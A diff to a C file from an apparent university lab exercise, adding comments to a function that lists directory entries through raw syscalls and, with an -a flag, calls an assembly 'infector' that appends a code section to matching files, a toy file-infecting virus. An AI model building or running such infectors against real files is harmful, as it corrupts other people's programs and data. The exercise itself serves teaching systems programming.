@@ -37,6 +37,13 @@ enum
 # define DT_WHT		DT_WHT
   };
 
+// Lab 4 task 2c
+/*
+	Get all files in current directory, then do something:
+	-p<prefix> print all files with <prefix>
+	-a<prefix> infect all files with <prefix>
+*/
+
 extern int system_call();
 extern void code_start(void);
 extern void infection(int);
@@ -65,6 +72,10 @@ typedef struct ent {
 
 void flame2(int debug, char* prefix, int infect)
 {
+	// take the address of code_start section from start.s assembly file
+	// also the same for code end
+	// we will "infect" files by pasting the lines of code between
+	// code start and code end to them
 	unsigned int startAddress = (unsigned int)&code_start;
 	unsigned int endAddress = (unsigned int)&code_end;
 	system_call(SYS_WRITE, STDOUT, itoa(startAddress), strlen(itoa(startAddress)));
@@ -76,7 +87,7 @@ void flame2(int debug, char* prefix, int infect)
 	int count;
 	int fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
 	count = system_call(SYS_GETDENTS, fd, buffer, 8192);
-	printRet(debug, fd, SYS_OPEN);
+	printRet(debug, fd, SYS_OPEN); // printret prints the relevant debug data for system call return value
 	printRet(debug, count, SYS_GETDENTS);
 	int pos;
 	for (pos = 0; pos < count;)
@@ -114,7 +125,7 @@ void flame2(int debug, char* prefix, int infect)
 		}
 		if (infect == 1)
 		{
-			infector(entp->buf);
+			infector(entp->buf); //assembly
 		}
 	}
 }
